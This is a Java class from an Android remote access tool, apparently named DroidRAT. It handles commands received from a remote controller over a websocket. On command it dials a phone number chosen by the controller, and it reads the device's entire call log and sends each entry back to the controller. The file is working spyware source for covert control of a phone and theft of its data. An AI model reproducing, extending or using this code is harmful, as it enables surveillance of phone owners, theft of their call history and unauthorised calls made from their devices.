package com.je_chen.droidrat_je.command.process.call;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import com.je_chen.droidrat_je.appintent.call.Call;
import com.je_chen.droidrat_je.appintent.call.CallLogs;
import com.je_chen.droidrat_je.command.process.CommandFather;
import com.je_chen.droidrat_je.command.process.CommandProcessInterface;

import static com.je_chen.droidrat_je.activity.LaunchActivity.websocket;

public class CallCommand extends CommandFather implements CommandProcessInterface {

    private final String TAG = "Call Event ";

    private Call call;
    private CallLogs callLogs;

    private Context context;

    public CallCommand(Context context){
        this.context=context;
        call = new Call();
        callLogs = new CallLogs(context);
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {
                case "Call":
                    String phoneNumber = rawCommandArray[2];
                    Log.d(TAG,"Call Phone " + phoneNumber);
                    call.call(context, phoneNumber);
                    this.send("Call Phone " + phoneNumber);
                    break;

                case "CallLogs":
                    Log.d(TAG,"Call logs");
                    for(String callLogs : callLogs.getCallLogs())
                        this.send("Call logs " + callLogs);
                    break;
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
